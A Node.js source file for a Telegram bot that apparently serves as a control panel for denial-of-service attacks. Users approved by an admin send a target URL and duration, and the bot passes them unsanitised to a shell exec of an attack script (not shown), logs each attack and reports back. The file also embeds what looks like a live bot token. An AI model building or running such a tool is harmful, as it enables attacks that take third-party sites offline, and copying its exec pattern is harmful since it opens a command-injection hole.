const TeleBot = require('telebot');
const fs = require('fs');
const { exec } = require('child_process');

// Telegram bot token
const bot = new TeleBot('6921417686:AAGMHfclMTZfG6nkc21H7r8WJBgGLSQ1xiE');

// Admin ID
const adminId = 7364889435;

// Check if user is authorized
const isAuthorized = (userId) => {
  const users = fs.readFileSync('users.txt', 'utf8').split('\n');
  return users.includes(userId.toString());
};

// Load logs
const loadLogs = () => {
  try {
    return JSON.parse(fs.readFileSync('logs.json', 'utf8'));
  } catch (err) {
    return [];
  }
};

// Save logs
const saveLogs = (logs) => {
  fs.writeFileSync('logs.json', JSON.stringify(logs, null, 2));
};

// Commands

bot.on('/start', (msg) => {
  bot.sendMessage(msg.chat.id, 'Welcome! This bot can execute WORM DOS attacks. Use /attack <url> <duration> to start an attack.');
});

bot.on('/attack', (msg) => {
  const args = msg.text.split(' ');
  if (args.length !== 3) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack <url> <duration>');
  }

  const [command, url, duration] = args;
  if (!isAuthorized(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "You're not authorized to use this command. Get approval using /getApproval.");
  }

  exec(`node ax.js ${url} ${duration} 11 KHALID1234`, (error, stdout, stderr) => {
    if (error) {
      return bot.sendMessage(msg.chat.id, `Error: ${stderr}`);
    }

    const logs = loadLogs();
    logs.push({ url, duration, dateTime: new Date().toISOString() });
    saveLogs(logs);

    bot.sendMessage(msg.chat.id, `Attack started on ${url} for ${duration} seconds.`);
  });
});

bot.on('/logs', (msg) => {
  const logs = loadLogs();
  if (logs.length === 0) {
    return bot.sendMessage(msg.chat.id, 'No logs available.');
  }

  let logMessage = 'Attack Logs:\n\n';
  logs.forEach((log, index) => {
    logMessage += `${index + 1}. URL: ${log.url}, Duration: ${log.duration}, Date-Time: ${log.dateTime}\n`;
  });

  bot.sendMessage(msg.chat.id, logMessage);
});

// Hidden command for admin to add users
bot.on('/adduser', (msg) => {
  if (msg.from.id !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Unauthorized command.');
  }

  const args = msg.text.split(' ');
  if (args.length !== 2) {
    return bot.sendMessage(msg.chat.id, 'Usage: /adduser <user_id>');
  }

  const userId = args[1];
  fs.appendFileSync('users.txt', `${userId}\n`);
  bot.sendMessage(msg.chat.id, `User ${userId} added successfully.`);
});

bot.start();
